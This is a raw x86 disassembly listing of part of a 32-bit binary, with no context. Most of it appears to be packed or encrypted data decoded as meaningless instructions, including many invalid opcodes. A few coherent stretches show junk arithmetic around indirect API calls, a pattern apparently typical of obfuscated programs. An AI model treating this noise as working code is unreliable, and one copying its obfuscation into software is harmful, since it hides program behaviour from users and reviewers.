  420668:	and    eax,0xe3891e9e
  42066d:	stos   BYTE PTR es:[edi],al
  42066e:	sub    DWORD PTR [eax],0x1dacb07b
  420674:	push   ss
  420675:	sbb    BYTE PTR [ebx-0x1fe7e7ee],ah
  42067b:	sbb    esp,DWORD PTR [edi+0x4187212f]
  420681:	cwde   
  420682:	dec    eax
  420683:	je     0x4206b8
  420685:	fidivr WORD PTR [esi+0x26]
  420688:	mov    WORD PTR [edi+0x75392473],ss
  42068e:	xchg   ecx,eax
  42068f:	mov    bl,0x7d
  420691:	sbb    eax,0x8ad68db7
  420696:	cmp    ebx,DWORD PTR [ecx+0x6d6f9e5]
  42069c:	retf   
  42069d:	jo     0x42065d
  42069f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4206a0:	lods   al,BYTE PTR ds:[esi]
  4206a1:	daa    
  4206a2:	push   cs
  4206a3:	inc    esp
  4206a4:	lods   eax,DWORD PTR ds:[esi]
  4206a5:	popa   
  4206a6:	adc    DWORD PTR [esi-0x60c80dc8],0x83786645
  4206b0:	loope  0x4206b3
  4206b2:	enter  0x57eb,0xb7
  4206b6:	sbb    al,0x22
  4206b8:	mov    esp,DWORD PTR [eax]
  4206ba:	adc    dl,cl
  4206bc:	daa    
  4206bd:	les    ebp,FWORD PTR [ebp+0x16b625b4]
  4206c3:	sub    eax,0x4f3c19f3
  4206c8:	out    0xb9,al
  4206ca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4206cb:	lds    ebp,FWORD PTR [ecx-0x43]
  4206ce:	out    dx,eax
  4206cf:	inc    edx
  4206d0:	dec    ebp
  4206d1:	jnp    0x420693
  4206d3:	into   
  4206d4:	jg     0x420679
  4206d6:	(bad)  
  4206d7:	pop    eax
  4206d8:	test   DWORD PTR [ebx-0x58495cca],esi
  4206de:	sub    DWORD PTR [ecx+0x44],eax
  4206e1:	ss dec edx
  4206e3:	jg     0x4206c2
  4206e5:	push   ss
  4206e6:	mov    ch,0x21
  4206e8:	stos   BYTE PTR es:[edi],al
  4206e9:	mov    edi,0xd74656c3
  4206ee:	xor    DWORD PTR [edx],esp
  4206f0:	lods   eax,DWORD PTR ds:[esi]
  4206f1:	jns    0xf5de5269
  4206f7:	leave  
  4206f8:	xchg   ebx,eax
  4206f9:	(bad)  
  4206fa:	dec    esp
  4206fb:	xor    al,0xf3
  4206fd:	data16 mov bh,0xa2
  420700:	ficom  DWORD PTR [ebx+0x31]
  420703:	and    BYTE PTR [ecx-0x273d6317],ah
  420709:	xchg   bh,bh
  42070b:	and    bh,BYTE PTR ds:0x1171200b
  420711:	aad    0x7a
  420713:	mov    ch,0xd8
  420715:	out    0x8c,al
  420717:	pop    ds
  420718:	out    dx,eax
  420719:	neg    ebx
  42071b:	dec    esp
  42071c:	cmp    ecx,DWORD PTR [edi]
  42071e:	fdiv   QWORD PTR [edx]
  420720:	xor    edi,esp
  420722:	cld    
  420723:	or     al,0xb8
  420725:	cmp    bh,BYTE PTR [edi+edi*4]
  420728:	shr    al,1
  42072a:	cmp    esp,DWORD PTR [ebp+0x4aaaebb]
  420730:	jl     0x4206e4
  420732:	mov    ds:0xb39d09bd,eax
  420737:	fwait
  420738:	mov    ecx,ebp
  42073a:	in     al,0xa5
  42073c:	div    BYTE PTR [ebp+0x72]
  42073f:	iret   
  420740:	and    al,BYTE PTR [eax]
  420742:	icebp  
  420743:	out    0xe0,eax
  420745:	pop    edi
  420746:	mov    ch,0xa5
  420748:	jg     0x42074c
  42074a:	(bad)  
  42074b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42074c:	mov    eax,0x1fcffd7e
  420751:	or     BYTE PTR [ecx+0x4f7f92dd],ch
  420757:	xchg   ebp,eax
  420758:	and    DWORD PTR [ecx-0x222e040],eax
  42075e:	out    0x90,al
  420760:	stos   DWORD PTR es:[edi],eax
  420761:	mov    ch,0x5c
  420763:	shl    dh,cl
  420765:	or     ecx,DWORD PTR [ebx+0x23]
  420768:	dec    eax
  420769:	cmp    DWORD PTR [eax+edx*1-0x7558bffe],edi
  420770:	xchg   esp,eax
  420771:	mov    al,0x9a
  420773:	xor    al,0x18
  420775:	mov    edi,0x696df46
  42077a:	or     ah,BYTE PTR [edx+0x5c]
  42077d:	mov    BYTE PTR [ebp+0xe],bl
  420780:	rcl    DWORD PTR [ebp+0x269e52f6],cl
  420786:	xor    DWORD PTR [edx+0x61],ecx
  420789:	cmp    DWORD PTR [edi+0x11],0xffffffb8
  42078d:	adc    BYTE PTR [ebx-0x10],al
  420790:	imul   BYTE PTR [esi-0x70b7b7a1]
  420796:	jne    0x4207c6
  420798:	and    dh,BYTE PTR [edi*2-0x116f239f]
  42079f:	in     al,0xb7
  4207a1:	outs   dx,BYTE PTR ds:[esi]
  4207a2:	jns    0x4207bf
  4207a4:	fsubp  st(1),st
  4207a6:	loope  0x4207cc
  4207a8:	fst    QWORD PTR [esi+0xc9f8778]
  4207ae:	lock adc cl,BYTE PTR [esi+0x5bdbb932]
  4207b5:	pop    ebx
  4207b6:	and    edi,esi
  4207b8:	xlat   BYTE PTR ds:[ebx]
  4207b9:	push   edx
  4207ba:	daa    
  4207bb:	cmc    
  4207bc:	bound  esp,QWORD PTR [esi]
  4207be:	push   ebp
  4207bf:	inc    ebx
  4207c0:	pop    ebp
  4207c1:	jbe    0x420833
  4207c3:	lods   al,BYTE PTR ds:[esi]
  4207c4:	outs   dx,BYTE PTR ds:[esi]
  4207c5:	xchg   esp,eax
  4207c6:	(bad)  
  4207c8:	int3   
  4207c9:	scas   eax,DWORD PTR es:[edi]
  4207ca:	add    DWORD PTR [esi],esi
  4207cc:	push   edx
  4207cd:	and    cl,bh
  4207cf:	in     al,0xfa
  4207d1:	mov    WORD PTR ds:0xc23ea7fe,?
  4207d7:	test   eax,0x5beddd05
  4207dc:	pop    edx
  4207dd:	inc    edx
  4207de:	and    al,0x76
  4207e0:	loopne 0x4207c9
  4207e2:	xchg   edx,eax
  4207e3:	dec    ebx
  4207e4:	gs adc eax,0x840ed25a
  4207ea:	div    bh
  4207ec:	out    0x51,eax
  4207ee:	fnsave [esi-0x64]
  4207f1:	sub    DWORD PTR [ebx],esp
  4207f3:	mov    ds:0x3a67c9a4,al
  4207f8:	fsub   DWORD PTR [edi]
  4207fa:	mov    edx,0xd387b39b
  4207ff:	cmp    edi,ebp
  420801:	ds into 
  420803:	push   ebx
  420804:	push   esp
  420805:	mov    eax,ds:0x67f9d915
  42080a:	gs inc esi
  42080c:	shl    ebp,0x14
  42080f:	dec    ebx
  420810:	mov    ah,0x49
  420812:	fsubr  QWORD PTR [ecx-0x30f82711]
  420818:	jae    0x4207ff
  42081a:	scas   eax,DWORD PTR es:[edi]
  42081b:	pop    DWORD PTR [ecx+0x60]
  42081e:	stos   DWORD PTR es:[edi],eax
  42081f:	cmp    edx,DWORD PTR [ecx+0xe35b544]
  420825:	or     DWORD PTR [ebx+eiz*1+0x5f],0xffffffbb
  42082a:	hlt    
  42082b:	(bad)  
  42082c:	pop    ebx
  42082d:	aaa    
  42082e:	sub    BYTE PTR [esi],0x28
  420831:	push   ebx
  420832:	adc    al,0xa8
  420834:	aam    0xb2
  420836:	push   ebp
  420837:	xchg   ebx,eax
  420838:	mov    bh,0x9a
  42083a:	arpl   ax,si
  42083c:	sbb    ah,BYTE PTR [edi+0x58]
  42083f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420840:	je     0x420894
  420842:	dec    ecx
  420843:	aam    0x8c
  420845:	mov    ss:0x3e293401,al
  42084b:	in     al,0x1e
  42084d:	enter  0x9c0,0x59
  420851:	rcr    BYTE PTR [edi],1
  420853:	out    0xb8,eax
  420855:	mov    al,ds:0x2d8f8c01
  42085a:	push   edi
  42085b:	jns    0x420835
  42085d:	enter  0xacf9,0x68
  420861:	shl    DWORD PTR [esi+eiz*2],cl
  420864:	mov    ebx,DWORD PTR [ebp-0x24]
  420867:	sub    ebx,DWORD PTR [ecx]
  420869:	sti    
  42086a:	scas   al,BYTE PTR es:[edi]
  42086b:	mov    ds:0xe2d299c5,eax
  420870:	es inc ebp
  420872:	jl     0x4208f1
  420874:	push   0x7df9abac
  420879:	or     eax,0x1cf9d7b9
  42087e:	push   ebp
  42087f:	jecxz  0x42083b
  420881:	mov    esi,es
  420883:	out    dx,eax
  420884:	add    eax,0xa92b521
  420889:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42088a:	pop    edx
  42088b:	mov    ebp,0x3a1071a1
  420890:	aam    0x92
  420892:	pusha  
  420893:	and    dh,al
  420895:	mov    edx,0x28cd6e05
  42089a:	popa   
  42089b:	xor    BYTE PTR [esi+0x3363ccf],ch
  4208a1:	inc    eax
  4208a2:	push   cs
  4208a3:	loop   0x4208ae
  4208a5:	mov    ds:0x2c5708c9,al
  4208aa:	and    dl,dl
  4208ac:	xchg   esi,eax
  4208ad:	icebp  
  4208ae:	mov    edx,0x278d192c
  4208b3:	int3   
  4208b4:	lods   eax,DWORD PTR ds:[esi]
  4208b5:	xchg   ecx,eax
  4208b6:	mov    al,BYTE PTR [ecx-0x5902e5a5]
  4208bc:	loope  0x4208f3
  4208be:	lahf   
  4208bf:	test   BYTE PTR [edi-0x16200355],ch
  4208c5:	(bad)  
  4208c6:	cmp    dh,dh
  4208c8:	test   DWORD PTR [esi+edi*1-0x53],esi
  4208cc:	rol    DWORD PTR [ebp+0x3c],1
  4208cf:	adc    bl,BYTE PTR [ebx]
  4208d1:	(bad)  
  4208d2:	clc    
  4208d3:	adc    DWORD PTR [eax-0x3b],ebx
  4208d6:	(bad)  
  4208d7:	mov    bl,0xbd
  4208d9:	adc    eax,0x8eb62bde
  4208de:	xor    edi,edx
  4208e0:	xchg   edx,eax
  4208e1:	gs repz js 0x420903
  4208e5:	mov    bh,0x8b
  4208e7:	and    DWORD PTR [ebp+0x74],edx
  4208ea:	fwait
  4208eb:	mov    al,ds:0xc63aabd9
  4208f0:	cmc    
  4208f1:	outs   dx,DWORD PTR ds:[esi]
  4208f2:	bound  edx,QWORD PTR [eax]
  4208f4:	loopne 0x4208e6
  4208f6:	jne    0x42089b
  4208f8:	mov    esi,0x66c4f3dc
  4208fd:	xchg   edx,eax
  4208fe:	mov    bh,0x82
  420900:	push   0xdcc06376
  420905:	stc    
  420906:	std    
  420907:	mov    ah,0x69
  420909:	or     eax,0xe7c76888
  42090e:	pushf  
  42090f:	mov    bh,0x60
  420911:	loop   0x42089a
  420913:	adc    ch,BYTE PTR [eax+ebp*4-0x84b5d5]
  42091a:	sub    DWORD PTR [ebp-0x17],ebp
  42091d:	rcr    DWORD PTR [eax+0x54],1
  420920:	pop    ds
  420921:	add    DWORD PTR [esi+0x6638dcc5],ecx
  420927:	push   edi
  420928:	out    dx,al
  420929:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42092a:	mov    ebx,0xdf8a122f
  42092f:	add    al,0x78
  420931:	clc    
  420932:	add    al,0x78
  420934:	fadd   QWORD PTR [esi+esi*4+0xa4bc044]
  42093b:	inc    ecx
  42093c:	ret    
  42093d:	pop    ss
  42093e:	inc    esp
  42093f:	jecxz  0x42097b
  420941:	jg     0x4208e4
  420943:	(bad)  
  420944:	gs and eax,0xdc4ed934
  42094a:	pop    esp
  42094b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42094c:	and    BYTE PTR [edx-0x37d14fcb],al
  420952:	push   es
  420953:	(bad)  
  420954:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420955:	and    BYTE PTR [ebp-0x7a95105c],cl
  42095b:	jbe    0x420966
  42095d:	mov    ebx,0x2eaafe6a
  420962:	pop    esp
  420963:	pop    ebx
  420964:	js     0x420933
  420966:	lea    ebx,[edi+edx*4+0x75]
  42096a:	lock pop esi
  42096c:	call   DWORD PTR [eax+0x7e]
  42096f:	mov    ecx,0xb9544e22
  420974:	mov    edx,0xb304e3f3
  420979:	xor    bh,BYTE PTR [ebp+0x6d]
  42097c:	or     eax,0x6f6f3f6f
  420981:	int3   
  420982:	dec    ebx
  420983:	mov    ah,0x6d
  420985:	xchg   ebx,eax
  420986:	fwait
  420987:	cs mov edi,0x1924fbe4
  42098d:	inc    ebp
  42098e:	mov    dh,0x7a
  420990:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420991:	std    
  420992:	sbb    DWORD PTR [edi],ebx
  420994:	add    DWORD PTR [ecx+0x1a3dd297],edx
  42099a:	nop
  42099b:	dec    esi
  42099c:	ficomp WORD PTR [edi]
  42099e:	mov    al,ds:0x3c902647
  4209a3:	xor    esi,DWORD PTR [edi-0xa]
  4209a6:	mov    esi,0x19328dfd
  4209ab:	aad    0xe9
  4209ad:	sub    BYTE PTR [ecx],ch
  4209af:	add    dl,BYTE PTR es:[eax-0x17]
  4209b3:	pop    ds
  4209b4:	and    edi,DWORD PTR [ecx]
  4209b6:	mov    DWORD PTR [eax-0x4],edi
  4209b9:	mov    DWORD PTR [ebp-0x94],0x561c
  4209c3:	mov    DWORD PTR [ebp-0x34],0x58bc
  4209ca:	mov    DWORD PTR [ebp-0x60],0x24c7
  4209d1:	xor    eax,DWORD PTR ds:0x428243
  4209d7:	mov    DWORD PTR [ebp-0x5c],0x7a45
  4209de:	xor    DWORD PTR ds:0x4282df,0x80d
  4209e8:	mov    eax,DWORD PTR [ebp-0x34]
  4209eb:	cmp    DWORD PTR ds:0x428307,0x0
  4209f2:	movzx  esi,WORD PTR ds:0x42821f
  4209f9:	mov    ecx,0x4d8b
  4209fe:	jmp    0x420a54
  420a03:	mov    DWORD PTR ds:0x42814b,0x6139
  420a0d:	mov    DWORD PTR ds:0x428383,0x3849
  420a17:	cmp    DWORD PTR ds:0x428307,0x0
  420a1e:	jne    0x420a40
  420a24:	push   0x53aa
  420a29:	push   0x7054
  420a2e:	call   DWORD PTR ds:0x428e30
  420a34:	sub    DWORD PTR ds:0x4282db,0xc6b
  420a3e:	inc    esi
  420a3f:	inc    edx
  420a40:	and    DWORD PTR ds:0x42820f,edi
  420a46:	and    edx,0x7a3f
  420a4c:	sbb    ecx,ecx
  420a4e:	and    esi,0x2474
  420a54:	mov    ecx,DWORD PTR [ebp-0x60]
  420a57:	adc    edx,DWORD PTR ds:0x42826b
  420a5d:	mov    edx,DWORD PTR [ebp-0x5c]
  420a60:	mov    esi,DWORD PTR ds:0x4282db
  420a66:	sub    DWORD PTR ds:0x4282ef,esi
  420a6c:	and    edx,0x160e
  420a72:	add    esi,DWORD PTR ds:0x42814f
  420a78:	sub    edx,ecx
  420a7a:	cmp    DWORD PTR ds:0x428263,0x0
  420a81:	mov    DWORD PTR ds:0x4282cb,ecx
  420a87:	mov    esi,DWORD PTR ds:0x428303
  420a8d:	jmp    0x420e58
  420a92:	mov    DWORD PTR ds:0x42824b,0x7aef
  420a9c:	cmp    DWORD PTR ds:0x428263,0x0
  420aa3:	je     0x420adc
  420aa9:	push   DWORD PTR [ebp-0x18]
  420aac:	push   0x4599
  420ab1:	push   DWORD PTR [ebp-0x14]
  420ab4:	push   DWORD PTR [ebp-0x10]
  420ab7:	call   DWORD PTR ds:0x428e34
  420abd:	mov    esi,DWORD PTR ds:0x42834b
  420ac3:	or     DWORD PTR ds:0x428273,esi
  420ac9:	xor    ecx,ecx
  420acb:	add    ecx,DWORD PTR ds:0x428183
  420ad1:	mov    esi,DWORD PTR ds:0x4283c7
  420ad7:	sub    ecx,esi
  420ad9:	or     ecx,DWORD PTR [ecx+esi*1]
  420adc:	mov    esi,DWORD PTR ds:0x42814b
  420ae2:	or     DWORD PTR ds:0x428273,esi
  420ae8:	add    ecx,0x4e9b
  420aee:	sbb    esi,ecx
  420af0:	sub    DWORD PTR ds:0x4282d3,ecx
  420af6:	or     esi,0x56f6
  420afc:	jmp    0x420e58
  420b01:	mov    bl,0xa9
  420b03:	lds    esp,FWORD PTR [edx-0x574d5d3d]
  420b09:	stos   BYTE PTR es:[edi],al
  420b0a:	xor    BYTE PTR [edi+0x7c],0x39
  420b0e:	xchg   ebx,eax
  420b0f:	xor    eax,0x1617366a
  420b14:	sbb    BYTE PTR [ebx+0x3f181812],ah
  420b1a:	repz jp 0x420b43
  420b1d:	and    al,0x1b
  420b1f:	push   esp
  420b20:	test   al,0x32
  420b22:	pop    eax
  420b23:	and    eax,0xffffffe3
  420b26:	jg     0x420ab2
  420b28:	mov    esp,0x4ec24a3f
  420b2d:	ret    
  420b2e:	mov    ds:0x733ba72c,eax
  420b33:	cmp    al,0xd0
  420b35:	aas    
  420b36:	iret   
  420b37:	adc    DWORD PTR ds:0xa465ed0b,ebx
  420b3d:	xchg   edi,eax
  420b3e:	adc    edx,edx
  420b40:	mov    WORD PTR [edi],cs
  420b42:	sub    eax,0x7da44065
  420b47:	jne    0x420acf
  420b49:	dec    edi
  420b4a:	fadd   DWORD PTR [esi+0x11dc00cc]
  420b50:	cmp    bl,BYTE PTR [ecx-0x7c244086]
  420b56:	std    
  420b57:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420b58:	mov    BYTE PTR [edx],0x8
  420b5b:	dec    edx
  420b5c:	xchg   ecx,eax
  420b5d:	mov    ecx,0x23b8a228
  420b62:	mov    ch,0xd8
  420b64:	shl    DWORD PTR [ecx+0x1b],1
  420b67:	(bad)  
  420b68:	fistp  WORD PTR [eax]
  420b6a:	in     eax,dx
  420b6b:	or     DWORD PTR [ebx+0x43],ecx
  420b6e:	pop    ss
  420b6f:	adc    DWORD PTR [ebx+ebp*1+0x1d],eax
  420b73:	inc    edi
  420b74:	mov    ds:0x1e051353,eax
  420b79:	in     al,dx
  420b7a:	test   eax,0xbdd1cb36
  420b7f:	test   DWORD PTR [edx-0x5d478121],ecx
  420b85:	jae    0x420bae
  420b87:	scas   eax,DWORD PTR es:[edi]
  420b88:	or     bl,BYTE PTR ds:0x4549c59f
  420b8e:	xor    bh,bh
  420b90:	push   ecx
  420b91:	xor    al,bl
  420b93:	xor    esi,DWORD PTR [ecx+0x2f]
  420b96:	inc    DWORD PTR [ebx-0x76b632c]
  420b9c:	sbb    edx,DWORD PTR [eax-0x29]
  420b9f:	mov    ch,0xb8
  420ba1:	movnti DWORD PTR [edx-0x32],edi
  420ba5:	jp     0x420b8d
  420ba7:	add    dl,al
  420ba9:	sub    esi,DWORD PTR [esp+eiz*2]
  420bac:	in     eax,dx
  420bad:	pop    esi
  420bae:	xchg   edi,eax
  420baf:	cmp    eax,0x75e0ddfa
  420bb4:	scas   al,BYTE PTR es:[edi]
  420bb5:	sbb    BYTE PTR [ebx+esi*8+0xf0edb1e],cl
  420bbc:	(bad)  
  420bbd:	pop    edx
  420bbe:	pop    edx
  420bbf:	inc    ebp
  420bc0:	sub    eax,DWORD PTR [esi]
  420bc2:	sbb    al,BYTE PTR [esi]
  420bc4:	fdiv   QWORD PTR [edx+0x7]
  420bc7:	or     dh,BYTE PTR ds:0x85a52eec
  420bcd:	mov    dh,0x66
  420bcf:	icebp  
  420bd0:	call   0x815263ab
  420bd5:	pop    ss
  420bd6:	push   ss
  420bd7:	push   esi
  420bd8:	jle    0x420b99
  420bda:	das    
  420bdb:	outs   dx,BYTE PTR ds:[esi]
  420bdc:	mov    ss:0x9a704ff5,eax
  420be2:	xchg   esi,eax
  420be3:	shl    ah,0x39
  420be6:	test   eax,ecx
  420be8:	mov    bh,0xf
  420bea:	fidivr WORD PTR [esi]
  420bec:	ja     0x420bbe
  420bee:	and    eax,edx
  420bf0:	cmp    eax,0x90150e08
  420bf5:	cmc    
  420bf6:	stc    
  420bf7:	push   ds
  420bf8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420bf9:	adc    ch,ah
  420bfb:	cdq    
  420bfc:	dec    eax
  420bfd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420bfe:	adc    al,0x7c
  420c00:	(bad)  
  420c02:	dec    ebx
  420c03:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420c04:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420c05:	mov    dl,0x3f
  420c07:	leave  
  420c08:	rcl    BYTE PTR ds:[eax+0x8],0x2e
  420c0d:	xchg   esp,eax
  420c0e:	sub    eax,0xe799f8c6
  420c13:	iret   
  420c14:	jp     0x420c61
  420c16:	fs mov dl,0x11
  420c19:	into   
  420c1a:	jae    0x420ba1
  420c1c:	dec    esi
  420c1d:	neg    cl
  420c1f:	sub    eax,0x6f0b2741
  420c24:	std    
  420c25:	nop
  420c26:	test   eax,0x6ee1f327
  420c2b:	or     eax,0x38b541c3
  420c30:	push   eax
  420c31:	retf   
  420c32:	dec    esp
  420c33:	icebp  
  420c34:	pop    es
  420c35:	sbb    eax,0xdca7bc5e
  420c3a:	mov    BYTE PTR [ebx-0x56],dl
  420c3d:	jo     0x420bf8
  420c3f:	pop    esi
  420c40:	daa    
  420c41:	add    DWORD PTR [eax-0x58682696],ebx
  420c47:	and    BYTE PTR [ebp-0x79],0x44
  420c4b:	fld    QWORD PTR [ecx-0x181541c2]
  420c51:	xchg   edi,eax
  420c52:	add    bh,BYTE PTR [esi]
  420c54:	mov    ecx,0xbd9afc36
  420c59:	fmul   st,st(4)
  420c5b:	dec    esi
  420c5c:	in     eax,0x2c
  420c5e:	aas    
  420c5f:	xor    DWORD PTR [esi-0x32],ebx
  420c62:	iret   
  420c63:	stc    
  420c64:	fcomp  QWORD PTR fs:[ebx]
  420c67:	mov    esi,eax
  420c69:	aaa    
  420c6a:	jg     0x420c67
  420c6c:	xchg   ebx,eax
  420c6d:	xchg   BYTE PTR [esi],ah
  420c6f:	mov    dl,0xed
  420c71:	cmp    DWORD PTR [edx],ecx
  420c73:	mov    cl,0xae
  420c75:	scas   al,BYTE PTR es:[edi]
  420c76:	icebp  
  420c77:	sub    BYTE PTR [esi],bh
  420c79:	xor    al,0xaf
  420c7b:	xor    eax,DWORD PTR [eax]
  420c7d:	inc    BYTE PTR ds:0x4c9ebf20
  420c83:	pop    esi
  420c84:	test   eax,0x6eab5500
  420c89:	aaa    
  420c8a:	xchg   ebp,eax
  420c8b:	das    
  420c8c:	lds    edx,FWORD PTR [esi+edx*1]
  420c8f:	imul   edx,DWORD PTR [edi],0xe0f93e39
  420c95:	lahf   
  420c96:	xchg   edx,eax
  420c97:	in     eax,dx
  420c98:	out    0x28,al
  420c9a:	xchg   esp,eax
  420c9b:	xchg   edi,eax
  420c9c:	xor    eax,0xa198de85
  420ca1:	je     0x420cfd
  420ca3:	jge    0x420c3a
  420ca5:	dec    edi
  420ca6:	das    
  420ca7:	jle    0x420cc2
  420ca9:	adc    dl,BYTE PTR [ebx+edx*4]
  420cac:	cmp    bh,BYTE PTR [edx]
  420cae:	and    ebp,esp
  420cb0:	lock lods eax,DWORD PTR ds:[esi]
  420cb2:	ins    DWORD PTR es:[edi],dx
  420cb3:	mov    ebp,0xd8d7cae5
  420cb8:	sub    ecx,edx
  420cba:	call   0xceba1046
  420cbf:	jno    0x420d16
  420cc1:	jbe    0x420cf3
  420cc3:	jg     0x420c69
  420cc5:	add    edx,edx
  420cc7:	call   0xda95:0x18e4fe49
  420cce:	xchg   BYTE PTR [eax+0x3c0d6027],ah
  420cd4:	iret   
  420cd5:	daa    
  420cd6:	jbe    0x420c88
  420cd8:	push   0x5a
  420cda:	sub    eax,0x9d95e9f8
  420cdf:	dec    ebp
  420ce0:	in     al,dx
  420ce1:	cmp    esp,DWORD PTR [ebx-0x76]
  420ce4:	add    al,0x13
  420ce6:	das    
  420ce7:	mov    edx,0xaf8d1c7
  420cec:	pusha  
  420ced:	adc    BYTE PTR [ebp-0x23ef4f40],cl
  420cf3:	pop    esp
  420cf4:	push   ecx
  420cf5:	daa    
  420cf6:	je     0x420c86
  420cf8:	(bad)  
  420cfa:	xchg   ecx,eax
  420cfb:	and    BYTE PTR [edx-0x6e],bl
  420cfe:	mov    dl,0x9d
  420d00:	je     0x420d41
  420d02:	test   BYTE PTR ds:0xe5315a66,ch
  420d08:	xchg   esi,eax
  420d09:	enter  0x4fb8,0x91
  420d0d:	mov    al,ds:0xba9582bb
  420d12:	or     ebp,DWORD PTR ds:0x523e756c
  420d18:	mov    ds:0xc89c5d59,eax
  420d1d:	push   eax
  420d1e:	inc    ecx
  420d1f:	xchg   ebx,eax
  420d20:	push   0xffffff96
  420d22:	push   es
  420d23:	add    BYTE PTR [ebx-0x425eaa30],bh
  420d29:	loopne 0x420d24
  420d2b:	or     DWORD PTR [edi],esi
  420d2d:	mov    al,ds:0xaa9d2708
  420d32:	iret   
  420d33:	in     al,dx
  420d34:	stos   DWORD PTR es:[edi],eax
  420d35:	call   0x1accfb33
  420d3a:	inc    esp
  420d3b:	or     eax,0xf4a25d7a
  420d40:	sbb    cl,BYTE PTR [ebx-0x2ee7e5f6]
  420d46:	jecxz  0x420d47
  420d48:	mov    ecx,0x6a45da98
  420d4d:	push   eax
  420d4e:	pusha  
  420d4f:	loopne 0x420d8c
  420d51:	xchg   esi,eax
  420d52:	pop    es
  420d53:	mov    eax,0x8566b907
  420d58:	hlt    
  420d59:	cdq    
  420d5a:	data16 ror bl,1
  420d5d:	sbb    DWORD PTR [esi-0x39075297],edi
  420d63:	push   esi
  420d64:	clc    
  420d65:	mov    DWORD PTR [ecx+0x32],esp
  420d68:	fstp   DWORD PTR ds:0x1bec7c37
  420d6e:	sbb    BYTE PTR [ecx+0x416a30e8],ah
  420d74:	in     al,0xa2
  420d76:	stos   BYTE PTR es:[edi],al
  420d77:	aas    
  420d78:	hlt    
  420d79:	add    BYTE PTR [eax],0xf7
  420d7c:	and    ebx,edx
  420d7e:	mov    edx,0x92a54842
  420d83:	xchg   esp,eax
  420d84:	mov    esp,0x8a7b2c6e
  420d89:	add    BYTE PTR [ebp+0x1b9718ef],dl
  420d8f:	mov    DWORD PTR [ecx-0x7f],edx
  420d92:	dec    esp
  420d93:	pop    edx
  420d94:	push   0xffffffbc
  420d96:	sbb    al,0xce
  420d99:	and    DWORD PTR [edx-0x6795e99d],edx
  420d9f:	or     esi,DWORD PTR [edx]
  420da1:	test   bh,cl
  420da3:	mov    esi,0x836f596b
  420da8:	pop    ebp
  420da9:	call   0x9775801d
  420dae:	mov    ?,WORD PTR [esi+eax*1-0x58661afa]
  420db5:	xor    eax,0xaf45ea61
  420dba:	cmp    dh,BYTE PTR [eax]
  420dbc:	outs   dx,BYTE PTR ds:[esi]
  420dbd:	out    0xaa,eax
  420dbf:	mov    eax,0x3af5b1ed
  420dc4:	pushf  
  420dc5:	ret    0x570d
  420dc8:	adc    bl,BYTE PTR [esi+0x14]
  420dcb:	test   DWORD PTR [ecx+ecx*8],0x53049d3a
  420dd2:	pop    esi
  420dd3:	add    edi,DWORD PTR [edx-0x48b954df]
  420dd9:	push   0x8058f313
  420dde:	push   0xaf3c15d4
  420de3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420de4:	push   0xffffffd9
  420de6:	(bad)  
  420de7:	loope  0x420da8
  420de9:	cmp    al,0xf3
  420deb:	dec    esi
  420dec:	sub    esi,DWORD PTR [esi]
  420dee:	out    dx,eax
  420def:	(bad)  
  420df0:	je     0x420df6
  420df2:	jnp    0x420e07
  420df4:	pop    esp
  420df5:	(bad)  
  420df6:	nop
  420df7:	inc    edx
  420df8:	inc    edi
  420df9:	loopne 0x420e23
  420dfb:	out    0xd2,al
  420dfd:	xchg   DWORD PTR [esi+0x16],ecx
  420e00:	jge    0x420e31
  420e02:	ins    DWORD PTR es:[edi],dx
  420e03:	push   esi
  420e04:	cmp    BYTE PTR [eax],0xb6
  420e07:	xchg   DWORD PTR [edx-0x50aeabbe],ebx
  420e0d:	loope  0x420e6f
  420e0f:	mov    al,0x9f
  420e11:	mov    WORD PTR [ecx+ebx*2],cs
  420e14:	popf   
  420e15:	mov    al,ds:0xc7967d2b
  420e1a:	mov    BYTE PTR [ebx+0x6e],ch
  420e1d:	repnz pushf 
  420e1f:	mov    dl,0x7f
  420e21:	add    al,0x8b
  420e23:	cmp    DWORD PTR [ecx+0x17],edx
  420e26:	lds    ebx,FWORD PTR [eax+0x74]
  420e29:	add    bl,BYTE PTR [ebp-0x7e]
  420e2c:	mov    ss,WORD PTR [edi-0x5af91daa]
  420e32:	sbb    bl,BYTE PTR [edi-0x70]
  420e35:	push   ss
  420e36:	fimul  WORD PTR [ebx]
  420e38:	rol    BYTE PTR [ebx+edx*4],0xc0
  420e3c:	mov    ah,0xdf
  420e3e:	pop    esi
  420e3f:	jo     0x420df6
  420e41:	test   al,0x8e
  420e43:	mov    bl,0x6d
  420e45:	lock scas eax,DWORD PTR es:[edi]
  420e47:	fidivr DWORD PTR [ebx-0x7226a1e3]
  420e4d:	addr16 je 0x420dfa
  420e50:	out    0x39,eax
  420e52:	adc    ch,BYTE PTR [ebx]
  420e54:	and    al,BYTE PTR [edx-0x1a]
  420e57:	mov    ah,0x81
  420e59:	jmp    0x358b:0x29ad
  420e60:	imul   eax,DWORD PTR [ecx+0x35190042],0x5f
  420e67:	add    DWORD PTR [edx+0x0],0xf
  420e6b:	scas   eax,DWORD PTR es:[edi]
  420e6c:	rol    BYTE PTR [ebx+0x42837b3d],1
  420e72:	add    BYTE PTR [eax],al
  420e74:	mov    DWORD PTR ds:0x428233,ebx
  420e7a:	mov    DWORD PTR ds:0x42816b,0x153
  420e84:	jmp    0x420efa
  420e89:	mov    eax,ds:0x42815f
  420e8e:	mov    DWORD PTR ds:0x428243,0x776f
  420e98:	cmp    DWORD PTR ds:0x42837b,0x0
  420e9f:	jle    0x420ecd
  420ea5:	push   0x428217
  420eaa:	push   0x42807f
  420eaf:	call   DWORD PTR ds:0x428e38
  420eb5:	add    ecx,DWORD PTR ds:0x428377
